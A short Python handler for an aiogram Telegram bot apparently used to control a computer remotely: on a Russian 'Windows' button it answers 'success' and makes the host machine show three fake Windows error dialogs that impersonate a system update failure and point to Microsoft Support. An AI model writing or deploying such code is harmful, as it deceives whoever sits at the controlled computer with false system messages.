from aiogram import types
from loader import dp

import pyautogui


@dp.message_handler(text=['📌 Окна'])
async def process_started_command(message: types.Message):
    await message.answer("🕓 Успешно!")
    pyautogui.alert(
        text='Windows does not support this format. Contact the app creator. ', title='ERROR')
    pyautogui.alert(
        text='Requirements: A Windows update has suspended this application', title='ERROR')
    pyautogui.alert(
        text='Submit a support ticket. Microsoft Support: https://support.microsoft.com/en-us', title='ERROR')
